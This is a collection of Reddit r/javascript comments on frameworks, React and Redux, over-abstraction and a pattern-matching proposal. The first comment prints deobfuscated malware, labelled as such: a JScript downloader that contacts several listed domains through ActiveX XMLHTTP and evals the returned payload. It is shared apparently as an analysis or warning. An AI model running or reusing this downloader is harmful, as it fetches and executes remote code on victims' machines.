**(THIS IS MALWARE DO NOT RUN THIS CODE)** I rewrote the code so it is easier to read. var domains = [ 'csasesores.com.ar', 'winnicemoldawii.pl', 'osadakrajenska.pl', '4southern.com', 'musaler.ru' ]; for (var i = 0; i &lt; domains.length; i++) { try { var request = new ActiveXObject("MSXML2.XMLHTTP"); var param = '0000001Hy8wio2SC1vruEx9SJVBEhWpfNtdW4KeZ01257900MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiJep6msku0P_MDqkw_wP6KVszD8z5CbTnVg2f68pJTzNzVPaGwsbBoHPr5DZLRWJ1-oge3XE1jjYQ9YG-Vq9QhPn5NkVVU3D7zBs4nv-Sb5s6rHL488xSaqWSFlVOO66erj1OXqIwAOdCgQykvMqN8RJgomtYL6jXj4ghIVC4CGjMdtc4UuP09EntymKaE8d9bM5lAqvyLHZT5AUnQBF0q4liA7kWuR8oBTod9QrfZ_lvCswG5ZZBVKmGcq6FnBYcqIrbtUCkCFjw9NTIS9j2MfA1Ml79SyiW5iz2OU_Umk4qF_Sc1vIzN6QgJlrGZBYGUBk_K0xVK1t9NDl65hTxQIDAQABrXF78RCv_d5oZsvlbbVjBIQ9YmuPRM0d--q_UO5f-g7Yusc_Pru2kbexAz1DjCQri4RwohHrTDCSYxM0'; var domain = domains[i]; request.open('GET', 'http://' + domain + '/counter?' + param, false); request.send(); var response = request.responseText; var bullshitHash = '5bbdf2c009a13767e2412a00381f2472'; var indexOfHash = response.indexOf(bullshitHash); if (response.length &gt; 1000 &amp;&amp; indexOfHash !== -1) { var obfuscatedCode = response.split(bullshitHash).join('a'); eval(obfuscatedCode); break; } } catch(e) {}; }
If you're looking for sample React code, Gatsby has a ton of example sites you can check out! https://github.com/gatsbyjs/gatsby/tree/master/examples We'll be adding many more there in the next month or so.
I tried to turn your GitHub links into [permanent links](https://help.github.com/articles/getting-permanent-links-to-files/) ([press **"y"**](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) to do this yourself): * [gatsbyjs/gatsby/.../**examples** (master → 177aad7)](https://github.com/gatsbyjs/gatsby/tree/177aad7fcf6055a53114f84ad5eee1a650c6ebba/examples) ---- ^(Shoot me a PM if you think I'm doing something wrong.)^( To delete this, click) [^here](https://www.reddit.com/message/compose/?to=GitHubPermalinkBot&amp;subject=deletion&amp;message=Delete reply djwy7hw.)^.
awesome!
coming soon!
You probably call res.send() with a loaded file on startup. You either have to update that file variable or use Express' res.sendFile() function
this is exactly what i wanted. thank you. i felt like i stepped back ten years going from my last stack to this, cause i dont know any of the tooling yet! : )
Does this cancel the request or only cancel the response/calling of `then` caused by the response?
I think the takeaway here is that since their app is simple and targets only modern Chrome browsers, it's fine without a framework. For more apps with more complex requirements, a framework is great. For example, this app obviously doesn't need isometric rendering since it's a video chat app and the page load time is 200ms.
Here's a real world example of an issue that was caused by this: https://github.com/yeoman/yo/issues/68
Additionally, you can always fork a library. I've hardly heard of anyone forking a framework though it does happen like with the team that created Django SwampDragon for real-time communication. Our own team forked a library 7 years ago, because it only had 1 maintainer (the creator), it saved 70% of the work creating our own library and we rewrote the other 30%. 
It's not always possible though for most people. Sure I can use Angular or React but hell if I can understand their code that powers it all. I can't submit a PR if I have no idea where to fix a bug. 
I think you hit the nail on the head. 
Do you have any tips for learning React? Sure I can learn how to write React, I did the tutorials etc. But I struggle with building an application with it. What should be a component? I did the tic tac toe game in React and I found myself adding layer over layer to push the data up the tree and it just felt like Inception. 
thank you haha!
Take a look at react native, you can write iOS native apps in JavaScript with it.
[removed]
What's better for single dev? Angular is not an option, because: 1) Outdated 2) SSR, because I am not sure if best SEO optimization is required. I mean, at some point I will be told to do SSR without any beforehand concent (typical for small size companies) Angular 4, well. I actually like it, but TypeScript. I mean just to make an ajax call to declare a service, datatypes ( any looks ugly for perfectionist :) ) instance of service etc etc. I want something lightweight, yet clever on syntax. React is a bit overcomplicated (tried it with Flux, Redux and MobX not for production) for me. If Ember is not much different and React is worth learning, I will spend more time with it and eventually get used to it. But JSX will always confuse me at some point. Feel like Underscore's template engine has better syntax :)
I love this. I used to be a chronic over-abstracter. Factories, services, modules -- if it could be extracted and generalized it _would_ be extracted and generalized. It felt so smart and I'd step back and look at a big refactor that involved implementing my slick new patterns and feel like a Ruby GOD. Then I'd come back to this section of the code a few months later and wonder why the hell it was setup this way, feel frustrated that adapting to a new business requirement would involve modifying all these abstractions, and spend a ton of time disassembling and refactoring. These days, I duplicate like a goddamn animal. Only when I realize that I'm reusing some really tedious boilerplate or making the same changes to the same functions throughout my codebase in the name of consistency do I start consolidating. I can delete freely as business needs change without having to break apart abstractions, I can scrap entire components without having to worry about generalizing them more, and things tend to be easier to reason about when I dive back in.
Mainly desktops, but I was wondering if mixing redux and streams would not look good (not concentional) and would even be useless?
smalltalk was the worst in terms of coding practice that I've witnessed. Even numbers were objects. And half of every function resolved to other functions that were maybe 6 characters long. And we overrode object all the time.
Well, I'm pretty biased in favor of React+Redux myself :) JSX is basically HTML, with a couple differences like `className` instead of `class`, and the ability to mix it with your JS. Other than that, I'm not sure one is strictly "better" than the other. You seem to have some prior experience and preferences already, so it's up to you.
Eh, how to say. Not hunting the "better", hunting for "better fits for my case" by asking opinions. Do you have experience with Ember? I think I might be a bit biased against react, because have seen it in createClass, Class extends and pure. Quite a transition in ideology there. Also, setting up the router is quite a fuss comparing to Angular's ui-router.
/r/learnprogramming /r/learnjavascript
&gt; ... and Fucking business requirements. I don't really care what language and words you use, but this definitely makes the author look unprofessional and will hinder a lot of people taking you seriously. Thankfully the rest of the article didn't devolve into a rant and was coherent. I agree with most of what the author wrote. In the end, the advice is essentially to figure out your actual business requirements, how much time you have, to avoid prematurely abstracting, and to treat (what someone said in the comments) these engineering concepts as guiding principles, not laws. &gt; Try to vertically split business functionality first before splitting horizontally. This makes sense. I want to call out something the author did not: some things do naturally make sense to split, or are generic enough that you might as well. A simple example is database access code. Your actions might contain the query, but they don't need the code used to connect and send the query. Some design patterns may also call for an additional layer of abstraction, like the [visitor pattern](https://en.wikipedia.org/wiki/Visitor_pattern). &gt; Everything is Generic I'm wondering what issues the author has with generics in SQL queries. In .NET we have LINQ and EntityFramework which work very well together to keep things type safe ... by using generics. Mapping can make sense as well; e.g., AutoMapper uses generics to automatically map properties. &gt; Shallow Wrappers Sometimes these are a necessity. I'm forgetting which classes, but in ASP.NET there are a handful that either cannot be extended, or hide members publicly. In order to do something like logging when a method is called, such a wrapper might be required. These does have the problem that all developers touching the code must be aware of these wrappers, and it can definitely be abused. I'm thinking of a wrapper for `Guid` that does nothing except have a different name ... &gt; Check Enterprise FizzBuzz (or Hello World). These examples are intentionally obtuse and are a bad example. Whether CQM tools approve of them or not (they are not contextually aware of the code and thus have limitations which their operators must be aware of) is irrelevant. This kind of code would not pass [most] code reviews. &gt; Sandwich Layers I don't know why the suggestion here is to learn another language. It's not really going to stop someone from over-abstracting. &gt; &lt;X&gt;–ity These are really design and business requirements, not guiding software development principles. If you designed and developed an interface that no one uses then that's a problem with product development. &gt; If someone really wanted to hack into our system, they don’t have to go through the OAuth layer. Okay, but that's not a reason to ignore security. If the software was already in a bad place, not writing secure code isn't going to make things better. &gt; In House “Inventions” I definitely agree with this. It's one of my biggest gripes with my current employer. Not-invented-here syndrome is very real. &gt; Following the Status Quo This one is very hard depending on the circumstances. I'm a big advocate of what the author is asking for and try to push useful changes when I can. However, with tens of millions of lines of code and 17 years of legacy software, it isn't always easy. &gt; TL;DR — Refactoring is part of each and every story. No code is untouchable. Ideally, sure. In reality refactoring takes time and is risky. That risk isn't always worth the reward. I'm saying this as someone who used to obsessively refactor every chance I got. &gt; Bad Estimation Bad estimation isn't a software over-engineering mistake, and it certainly isn't limited to software development. ------ The downvotes without discussion is disappointing. 
**Visitor pattern** In object-oriented programming and software engineering, the visitor design pattern is a way of separating an algorithm from an object structure on which it operates. A practical result of this separation is the ability to add new operations to extant object structures without modifying the structures. It is one way to follow the open/closed principle. In essence, the visitor allows adding new virtual functions to a family of classes, without modifying the classes. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/javascript/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^] ^Downvote ^to ^remove ^| ^v0.24
While you are certainly right that frameworks come with documentation and that this common knowledge forms a foundation for future developers, I would like to add that the same can be said for vanilla JS. The framework is just another layer of abstraction.
Why can't React/preact work in the scenarios you provided?
Agree. I had to change a tiny bit of code (literally adding 1 parameter to do some checks), which was a 2 hour refactor of some massively abstracted shit, which wasn't even useful because it was only used by 1 class!
All I know is that any popular library will have far fewer bugs than any library I write from scratch.
You should take à look at https://www.freecodecamp.org
My current project I'm using React, Redux, &amp; RxJS with redux-observable and find it very useful.
So, I am (or, I guess... was...) a working technical writer. What kind of advice are you looking to collect?
A full medium article to explain this is in the pipe, but in short: * it uses `angular-cli` as the base :) * documentation, coding guides for TS/SCSS/HTML, Angular onboarding guide * improved tooling: SCSS &amp; HTML lint, stricter tslint rules, markdown-based wiki local server for docs, i18n out-of-the box with dynamic language change * template with example app structure tailored for scalability, with examples and boilerplate code for everything: unit tests, directive, components, routing, authentication, http service extensions... * internet proxy support (almost always needed in enterprise environment!) * API proxy support to easy development using a remote server * add on support to plug in your own generator additions: your enterprise theme, SSO authentication, backend, whatever your need 
Did you start off some boilerplate? If not, could you please tell if you used create-react-app. How did you wire up redux-observable?
I've never touched Ember or Angular myself - just GWT, Backbone, and React. Not sure what your point is regarding React classes, or what you mean by "transition in ideology". `createClass` exists because React was started long before classes were an official part of the Javascript language. Now that ES6 classes exist, the React team encourages everyone to use `class MyComponent extends React.Component`, and they are semi-deprecating `createClass` by splitting it out into a separate package. `PureComponent` exists to simplify the very common use case of "I want this component to only re-render when its props or state actually change", ie, built-in handling for a standard optimization approach. Otherwise, `React.Component` and `React.PureComponent` are the same. You can also define components as just functions if you only need to render UI from props, and not use lifecycle methods or state for that component. It's worth noting that React-Router, while widely used, is a third-party library and not from the actual React team. It's the most commonly used routing library for React apps, but there _are_ other options out there as well.
Thanks for making this! I use concurrently right now and this seems like a really nice alternative. 
it depends. do you need to render the csv in an editable excel-like grid? or are you just looking to render charts and aggregate totals? how many dom elements do you expect to have to render if you were to use vanilla js? unless they're properly occlusion-culled, large data grids kill UI performance very rapidly, even before framework overhead is factored in. getting occlusion culling right it 2 dimensions (like Google Sheets or Excel) is pretty tricky to get right. but if you have a pre-determined number of columns (which is likely the case) it's much easier. https://github.com/handsontable/handsontable http://adazzle.github.io/react-data-grid/ https://github.com/developit/preact-virtual-list prolly lots of others.
[removed]
Thanks for extensive answer. When I was trying react I used ESLint with airbnb rules, which encouraged pure components. &lt;Route path='*' component={NotFound} /&gt; this is what is super counter-intuitive and ugly as for me. Backbone's router is much more good looking as for me: var Workspace = Backbone.Router.extend({ routes: { "help": "help", // #help "search/:query": "search", // #search/kiwis "search/:query/p:page": "search" // #search/kiwis/p7 }, help: function() { ... }, search: function(query, page) { ... } }); I would gladly go for Backbone, but doing quick check on jobs postings it appears that React has 10 times more posts. Maybe it might be the case of quality over quantity. Angular is doable for me, but DI, directives, two way data binding and not encouraging promises (callbacks instead does not encourage me much).
While i think JS is getting pretty bloated (it got some essential stuff in ES6, but a lot of the recent proposals picking up steam are just bloat), and I think we should be more conservative adding stuff to it...I can't help but squeal like a little kid at this one. It's my #1 missing feature (#2 being the |&gt; operator). It just solves so many problems related to types, things like Redux reducers, and enables a ton of FP scenarios in an elegant way.
Yeah, AirBNB's ESLint config has been pretty good, but they've been making it much more restrictive and opinionated over time. You should feel free to use it as a starting point and override rules you don't agree with, and that includes using class components if appropriate rather than functional components. React-Router recently released v4, which is a completely different API from their previous versions. Its main selling point is that routing is "just components". If you don't like that API, you might want to look at v3 instead, or one of the other React routing libraries out there. (I've never used _any_ routing library myself, as my apps don't need routing, but the snippet you showed there looks like a perfectly normal use of React to me - rendering a component, and passing in another component as a prop.)
I think you have an interesting definition of craftsmanship. You equate "craftsmanship" with "unique, special...one guy typing away for a year" and assert that code created with the help of linters, guidelines, editor snippets, and practicality is the *opposite* of craftsmanship. In my mind, well-*crafted* code can *only* be created with the help of linters, guidelines, editor snippets, and the like. Craftsman-quality code is created with these developer tools by a deliberate and patient developer who is intensely focused on practicality and minimalism.
Redux + RxJS is a natural combination. redux-observable is amazing, and it trivialises some pretty complex scenarios. 
That's the problem I have with react I guess. More inclined to JS, not JSX :)
😀 Thanks for checking it out! I've been a long time user of concurrently as well, it just doesn't scale for all situations
Well, if you don't want to use JSX at all, you don't have to. In fact, I just published a blog post on [Integrating React and Redux into an Existing Backbone App](http://blog.isquaredsoftware.com/2017/07/react-redux-backbone-integration), where I talk about how we can't use JSX because our Backbone app doesn't have a compile step, so we used the [react-hyperscript-helpers](https://github.com/Jador/react-hyperscript-helpers) library instead. There's several other "JSX alternatives" options out there as well.
The most straigtforward approach is to use just enough obj-c, or java or whatever language that has access to the most api of your target OS for your needs (and is easily deploy-able). Use that to create a server, that opens a browser window pointing back to it. Couple of 200 responses, serve up files based on url, intercept javascript function calls with json blobs for request/response, etc. Make it listen to localhost only of course. It is really pretty trivial under the hood, and stuff you *should* probably understand. But with this approach you simply reuse your javascript view and only customize the bits you need. I think there are still a lot of gotchas in IOS development though, especially in distribution. Even w/react or cordova or whatev. But they have a rather standard looking socket interface: https://developer.apple.com/library/content/documentation/NetworkingInternet/Conceptual/NetworkingTopics/Articles/UsingSocketsandSocketStreams.html
What if you define a function which will one day become a part of the standard library? Then it's not extending anymore, it's overriding. 
I will want to have an excel-like grid as an option, but the main thing that I am looking for is to pull different variables or rows from the data and present them in custom d3 visualizations. The main thing that I am looking for is an easy way to add different pages, tabs, controls, etc. My past methods to solve something like this have included outputting HTML from Javascript, creating a tab manager class that controls which function to call to render the current visualization/content, etc. I want to take advantage of the templating, pages, caching, etc. available in frameworks and not have to do this code over and over. So essentially I need something customizable, but that gives me the backbone. I assume that I could use one of those three links that you provided as an add-on to display an excel-like grid.
This article hits on a feeling I've been having lately as I've been wearing more than just the developer hat. I've made the same mistakes mentioned in the post like many of you. Reflecting on the last couple years I've come to the realization that 'over-engineering' is a symptom, not the problem. The problem stems from not having concrete business goals, thoroughly flushing out requirements (with users) and most importantly creating realistic timelines. Even if I'm a solo dev, I'll try to put on my PM hat and write down the requirements and sketch some rough wireframes before writing code. You need to have a clear understanding of what needs to be built now versus later. Before writing any code, try to think about how you would communicate the requirements to another dev such that they can deliver quality code that meet milestones. If you handed another dev a piece of paper that said "build me facebook for cats" they'll spend the first year building infrastructure to support 1 billion kittens. Both the business and engineering have equal responsibility to make sure milestones are met while delivering quality code. The business needs to understand and clearly define the "why" and engineering needs to understand the "how", recognizing what code needs to be written now and what can be written later. It took me a lot of mistakes to fully appreciate the mantra ["The best code is the code you don't write"](https://blog.codinghorror.com/the-best-code-is-no-code-at-all).
Why do you want to do this anyway? JavaScript seems to be moving more towards functional paradigm and I really don't see a problem with defining own function `lastItem(array)`. I even prefer it, because I have to explicitly import it so I know where it is available and where it isn't. By doing this, you have to ensure that the code which "extends" the native object's behavior always runs before your code, which can quickly turn into a big mess.
What a terrible website. 
if you use react native you can write your own "bridges" as they call them and get cross functional code. Write your own custom plugins and packages and share them with the community :)
Right on, well said 
You'll be happy to know that the other feature I'm championing is `|&gt;`. Both part of my dream to Make Functional JS Great Again!!!1
As the champion and author of this proposal, happy to answer any questions.
[This is going to kill performance on V8. Mutating built-in prototypes means no fast path for you.](https://twitter.com/_gsathya/status/880118639915016192)
Tried starting with your tutorial but got stuck early with an error about gatsby-config module not found.
This. Whenever I see posts asking what makes a senior dev, things like what you're describing really jump out at me way more than being able to give a really clear explanation of JavaScript's `this` behavior. Syntax and rules can be learned quickly but knowing how to build something fast, get the job done, and not be leave yourself a mountain of debt take time, experience, and perspective.
Oh believe me, I've been following it very closely. Though I didn't associate the names to realize they shared a champion. Adding you to my little "heroes" list. Add those 2 features and we can call JavaScript done as far as I'm concerned (anything else might be more suitable for different languages in Web Assembly). Ok, maybe a stretch goal with immutable data structures. But that's just a stretch goal.
Let's say that we have a list `[1,2,3]` and we use `map` in our favorite FP lib/language, to produce a new list of `[2,4,6]`. At some point in time, we *must* mutate the returned array in order to add items to it. What I believe u/AndrewGreenh is trying to get is the question of 'If a function mutates its scope but no one has access to that scope, is it pure', something akin to [this](https://softwareengineering.stackexchange.com/a/196119). If you want to create debounce in a purely functional manner, I would look into how Haskell handles I/O via Monads ( I think ). It seems to answer the question of 'How do I have side effects in a purely functional world' and I think that `setTimeout` is a side-effect regardless of your paradigm.
&gt; The House wins in the end. The best quality of a Design today is how well it can be undesigned. Absolutely agree. It is my most important reason for not using frameworks. You cannot simply take the framework out of an application and easily move forward. The framework is often the foundation and removing the framework typically means a complete rewrite.
That was a loooooong time ago though :-)
Sproutcore, not Ember was created around that time
It doesn't matter - you would achieve the same loading documents into frames instead (there was an actual _frame_ tag from Netscape, which wasn't the same as IE's _iframe_ who then became standard)
It wasn't a clone, it was a replacement. It never really took off, luckily
The trick is not de-duplication, it actually thinking a out what the procedure is and making an abstraction of it. If a new requirement to something impacts several layers of abstraction, you probably abstracted wrong. A new requirement may mean writing a new module to do what is needed and calling that instead, but the old abstraction still serves a purpose. I am so sick of dealing with flags people throw at methods and passing them 4 deep to enable some feature they added to a method that should only serve a single purpose and now it serves two. Make a new method for that case. The new business rule might mean you need another branch of logic.
Auth0 provides a pretty good service for this. They even provide the registration, login, and user management through a nice GUI dashboard. You can also register API's through their UI and define scopes. Then when a user authenticates they will be sent a JWT which they will have to append to within the header of every API request they make. You can then just verify the token and ensure they have the correct scope for the API. It's not the exact flow you are looking for, but its easy to implement and they provide a ton of tutorials and language options for SDK's. It's also nice to have somebody else handle storing and generating your secure tokens. It's a pretty solid service. [Auth0 link](http://auth0.com)
React native, and Cordova apps, are you best shot if you want to use javascript to create an app. 
Seems like we see eye-to-eye here. I was going to present my vision for "syntax complete ECMAScript" which was basically those two, plus classes v.next, do exprs, and regexp improvements. But then I figured I'm no oracle and who knows what the future holds. Maybe we'll get new keyboards that makes `@` and `🛡` equally easy to type and the syntactic budget grows as a result?
yawn.... why don't you fuck off back to /r/java then?
[removed]
&gt; Why aren’t you using Prettier? Because a) it's too fucking opinionated, b) I try to limit the number of dependencies if I can. I'll stick to eslint with the --fix option, but thanks for asking
I've been writing code for a long time and have used almost every JS framework out there and I'd still need to study before doing another interview. Most of these tests don't accurately represent what I do everyday. IMO, a senior developer will be able to articulate what defines "good" code as opposed to reciting answers from StackOverflow. My favourite article to this day that I recommend all developers read is [Bumper-Sticker API Design by Joshua Bloch](https://www.infoq.com/articles/API-Design-Joshua-Bloch). Everything you write as a programmer is an API to something (or someone) else.
This is correct. HOFs are not just "functions that take a callback"
I think you have basically just described how Cordova works under the hood. It uses an ObjectiveC / Java blob to talk to the native OS, and runs Javascript inside a web view. The two talk to each other over some kind of bridge layer (the bridge isn't necessarily HTTP-based, but this is an implementation detail). Rather than reinvent all this stuff, it might be even more straightforward to just use Cordova directly. Why reinvent the wheel? Or use React Native, which ditches the web view and renders the GUI using native code for even better performance.
I agree fully. Further, frameworks have this nasty tendency to break everything on major releases. RoR was one of the worst until Angular 2 came along and showed everyone just how bad a major version can be. These days, I prefer small libraries and gluing them together.
This is pretty awesome, in the meantime though, do you know of any babel plugins that give this kind of functionality? Typescript does the tiniest bit with some of their enum support but it's not great.
as far as I know, Babel plugins can only really act on the code output, not change the parser (unless they introduced parser plugins when I wasn't looking). the plugins that add syntax features just toggle on or off existing parser features and add the transpilation.
Looking at the proposals in Optional Extensions, I think there's a couple of stuff there that, to me, are almost mandatory to get the full power of this proposal. The value matching ability to do stuff like x &gt; 100 and/or the guards ("if predicates") are really important to me. Also, is there a strong argument for allowing imperative statements at all, instead of just expressions? Almost any use case I can think of for imperative statements in the branches seem like a code smell. Maybe I'm not thinking it through (but if it was only expressions you could just use a function when you need statements as an escape hatch anyway). There's throwing I guess...but aside from that?
Not yet, but there's a bug filed on Babylon already to implement this syntax. I think it's too early for that, personally. There are a few key issues to address first!
&gt; Even numbers were objects. you're really gonna hate JavaScript then :/ (5).toFixed(3) // "5.000" typeof null // "object" don't even glance at Ruby!
Hellyeah bring this shit in BABy!
I don't understand how using Preact (or React or Vue or...) would remove the need to rewrite in 3 years. 3 years is a lifetime in web development years. Could you please elaborate? 
Thanks for your thoughts on the optional extensions. I tend to agree with you at least about if predicates. Sometimes you want statements - it's hard to generalize. Many alternative proposals use case-like legs presumably for this reason. One typical use case is calculating some result on a line, then returning it. Or having an additional if block or something.
time to dust off that 3-sided coin
With `redux-observable`, you hook up what are called `epics` during when you create your `store` for `redux`. These epics are Observables that return actions based on other actions. Their [docs](https://redux-observable.js.org/) are amazing.
different goals. This is a pretty simple "wheel" conceptually, and you will certainly learn a lot more in the process. Sockets have been around for 35 years and are the backbone of any internet application. Many layers of abstraction later, it still looks pretty damn simple. Wait for connection, read data, write data. That is all xmlhttpwhatever is doing.
For an app I have written, we used JS to manage some of the shared logic between our web app and iOS app, and essentially built an ObjC front end for that logic (this was before React native, and Cordova UI performance is poor). So you could definitely do something like that. 
&gt; And I wanna know if it will help and how When I start to code ... Well, if you already know a programming language it will be easier to learn others. It's like asking "how will learning how to program help me when I start to write programs".
Oh yeah, I didn't think things through, haha. Obviously in JavaScript we don't have anything akin to Elm's let to easily do intermediate computations in a single expression so you need statements. Derp! 
edit: looked briefly at react native, I don't think it is entirely "native". In fact they discuss bridging to the "native" realm for things like touchscreen, the rest being in a "javascript" realm, i.e. JavaScriptCore on ios (same as used in safari) https://medium.com/@talkol/performance-limitations-of-react-native-and-how-to-overcome-them-947630d7f440 and reacts come and go, and this can be put together in 1/100 the time it takes to get up to speed on an entire framework (once you bother to learn how to do it, after that you are just porting it).
As I'm working on wide scale projects dealing with hundreds of distinct applications built by various teams these days... I can honestly say that MOST tech debt is the result of someone trying to save a few lines of code. Its not bad requirements. It's not tight timelines. It's someone seeing something simple that takes 10 lines of code, and going (often not on purpose): "How can I make this complicated so it can be 5 lines instead of 10?". Repeat enough time and you have virtually every convoluted code bases ever. We used to have issues with PHP spaghetti where everything was a bunch of nested if/else. We've now gone full circle to the opposite, and its not any better.
talking like the 90s, and javascript numbers aren't "first class" objects, just some duct tape when using them with methods: "Primitive values (like 3.14 or 2014), cannot have properties and methods (because they are not objects). But with JavaScript, methods and properties are also available to primitive values, because JavaScript treats primitive values as objects when executing methods and properties." https://www.w3schools.com/js/js_number_methods.asp
&gt; Factories, services, modules -- if it could be extracted and generalized it would be extracted and generalized. It felt so smart and I'd step back and look at a big refactor that involved implementing my slick new patterns and feel like a Ruby GOD. Then I'd come back to this section of the code a few months later and wonder why the hell it was setup this way, feel frustrated that adapting to a new business requirement would involve modifying all these abstractions, and spend a ton of time disassembling and refactoring. &gt; These days, I duplicate like a goddamn animal. It's somewhat puzzling to read this description, because "factories, services, modules" and so on are patterns that (if done correctly) promote flexibility and reuse. Where in reuse it means you shouldn't "feel frustrated that adapting to a new business requirement would involve modifying all these abstractions, and spend a ton of time disassembling and refactoring". The solution isn't using patterns and techniques without knowing how to extract value from them. But the solution isn't duplicating "like a goddamn animal", either. You'll be here in a few years, complaining how duplication left you frustrated dealing with dozens and dozens of big and *slightly different* versions of the same codebases.
[@AdamRackis's latest tweet](http://i.imgur.com/LhrDsr3.jpg) [@AdamRackis on Twitter](https://twitter.com/AdamRackis) - ^i ^am ^a ^bot ^| ^[feedback](https://www.reddit.com/message/compose/?to=twinkiac)
This is basically a runtime type checking specification for Javascript. Which is something anybody who's played with Typescript for too long ends up wanting sooner or later. So that's very cool. I think it's maybe missing some bits around the ability to specify "this must be a boolean", which could be emulated with a way to say "this must be one of two values". "this must be a number" could be emulated with a way to specify numerical ranges (although depending on the spec, it might end up matching "123", which would kinda suck.), etc. With a few such tweaks added, I think TypeScript would be able to have stuff like this interface Point { x: number; y: number; } interface WeirdPoint extends Point { x: string; } match (obj) { Point[]: console.log("array of points!"); WeirdPoint[]: "console.log("array of weird points!"); } That would map straightforwardly to JS code, and would be generally super neat. 
&gt; At some point in time, we must mutate the returned array in order to add items to it. The big difference I see is that your array mutations would be local to the function. None of those mutations would persist between calls. But when the thing being mutated is non-local, like debounce's timeoutID, then the mutation persists and purity is lost. Local mutations: function addOne(x) { let y = 0; y++; // &lt;-- mutate "y", but it's ok; no one will know return x + y; } addOne(2); // 3 addOne(2); // 3 addOne(2); // 3 Non-local mutations: function makeAdder() { let y = 0; return function addOne(x) { y++; // &lt;-- mutate "y", bad news; now the same inputs will return different outputs return x + y; }; } let addOne = makeAdder(); addOne(2); // 3 addOne(2); // 4 addOne(2); // 5 Even though we may think of "y" as being ours, even though "y" may not be accessible from anywhere else, we can't freely mutate it and still be pure. This is why I like the term "referential transparency" better than "pure". Referential transparency offers a concrete test: can a function call be replaced with its corresponding value without changing the program's behavior. In the case of the non-local "y" and debounce, the answer is no.
&gt; This is basically a runtime type checking specification for Javascript. Pattern matching is basically runtime type checking? You lost me man. I like the articles description far more &gt; Pattern matching is a way to select behaviors based on the structure of a value in a similar way to destructuring.
I agree that `referential transparent` means more and is more clear than `pure`. My question now: is `makeAdder` a pure function?
Outer function, yes; inner function, no.
hmmm that was actually very helpful, thanks!
Hi /u/Alderxian, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index).
Hi /u/our_best_friend, please keep it civil. Thanks.
Your edit isn't any better, and your comment is still hidden. Also, I think the word you're looking for is "severe".
This. I like this. Please make this happen. (I like pattern matching too, I would love to have both)
Abstraction is a paradox. In theory, doing it allows faster implementation of new, similar features over time, but you cannot pick a correct abstraction without knowing what all of those features are going to be. So you're better off just repeating yourself as needed, and then when the project is done and you have maximum information about the requirements, abstracting out a proper design and architecture for the code. But if the project is done, then doing the abstraction is pointless anyway... That said, I think the biggest issue is attempting to abstract *procedures*, rather than atomic operations. The more fine-grained and atomic an abstraction is, the less assumptions makes and coupling it does, and thus the more flexible and re-usable it will be. 
it's pretty close. Some stuff is missing, and it can do things that go beyond strict type checking, but it's definitely in the same neighborhood. My hope is that the missing stuff can be added in there. Ostensibly, it would enable to match more complex patterns. Incidentally, it would make type-happy types like myself happier. 
I think it's really more about striking a good balance between abstraction and duplication. Unfortunately, learning where the balance lies relies a lot on experience, and understanding what direction the product is headed. If you know you'll be implementing some functionality within the next 6 months, you can gradually take steps to make it easier to achieve that goal down the line, or at least avoid making it more difficult. It also depends on the purpose of what you're working on. If it's a quick experiment, it might be alright to cut lots of corners. But if you're committed to supporting the feature set for a few years, you'll want more robust code and stricter tests to avoid regressions. Both use-cases are perfectly valid.
The comparison is flawed. Some of those 5 criteria is either not important or completely irrelevant in some cases. What about server-side rendering support? What about component scoping? Even in each criteria, those libraries handle them differently. We used Radium in a super big project and the way handle inline auto prefixing is flawed with the little library that they use to detect user agent is not even up to date and nobody cares about fixing it. My advice is pick what is most actively supported by the community (styled-components, glamorous, etc.).
God did I need to read this. I had these thoughts exactly since I started writing multi layered systems, and I always feel insecure about duplicating and often waste time trying to find what I did wrong that made it hard to generalise because "duplicating would be wrong". My college teachers could use reading this article. They make the most tiny code flow duplications seem like the Devil and they told us that over and over for 4 years.
https prevents man in the middle attacks api keys limit who can Access your api beyond that is nothing
Thanks for that. Even with api keys, the data is sensitive and I do not want users to be able to access values directly. I've thought about ways to use keys to validate/authorize, but they could always look at browser source or debug for actual values. :-/
I like you. Normally all we hear are the cries of "js stdlib is tiny and useless" but I'm more concerned about the opposite happening. And I agree well that while theres a lot of garbage proposals out there, I hope this one gets a speedy stage-1.
I learned to love this in scala. This would be a good change. 
While I agree I think the point could be sold better by having some examples (though maybe these were intentionally excluded for the sake of being "non-technical"). Specifically one of the things I like most about Vue is that it isn't tied into JSX, so you can use regular HTML templates if you want (though, like Angular, logic is embedded in the templates)
I would recommend you look into mithril Http://mithril.js.org It's small, it's fast, and it's easy to wrap your head around, everything is just a dang function. There is no magic. 
Looking to give this advice. I do a lot of it myself. Just curious what questions people have...
For development _and_ production, check out [pm2](http://pm2.keymetrics.io/).
I wrote a cond function in JFP that, when coupled with Signet (https://www.npmjs.com/package/signet) gives you some pretty powerful type-driven behaviors. My team at work started using Signet and it has changed everything. It's not as elegant as a nice, clean match syntax, but it's a step that way. I do wish typescript were a little less dependent on classes and interfaces for types...
What you're asking for is not possible. Once code gets sent down to the client, the client can do whatever they want with it. If opaque data is paramount to your business model, your only option is to generate the charts/graphs on the server side. There are many ways to do this, like using R or a server side library for charting - however, since you have mentioned that you've already been working with d3, I would recommend you write a Node.js script that utilizes a module called `jsdom` to simulate the DOM outside the context of a browser - this way, you can use your existing d3 code. However you call this script is up to you - if you're already using a Node.js backend, then not much is needed - otherwise, spawn a child process that executes your script as a command, passing the data as a command line flag.
How can you protect API keys from being stolen if you are using a framework like angular ?
Abstraction is a skill that demands experience. Wrong abstractions often come from not-so-experienced programmers who abstract wrong things in a wrong way and at the wrong time. Abstraction is not bad, but: 1. it should be done in proper time - "premature optimization is the root of all evil" (abstraction is an optimization of future effort). 2. both implementation of abstraction and its usage should be simple (many people abstract in overcomplicated way. They introduce complexity instead of simplify anything). 3. it should be appropriate. People often abstract wrong things. Things that don't need to be abstracted (profit is minimal, zero or even negative), or abstract on wrong level.
Perhaps you need another abstraction!!
If you do your first application of given kind* you don't know. But if you have experience with few similar projects in the past, you can predict many things, based on previous experiences with previous projects... *for example first Single Page Application, first mobile game etc.
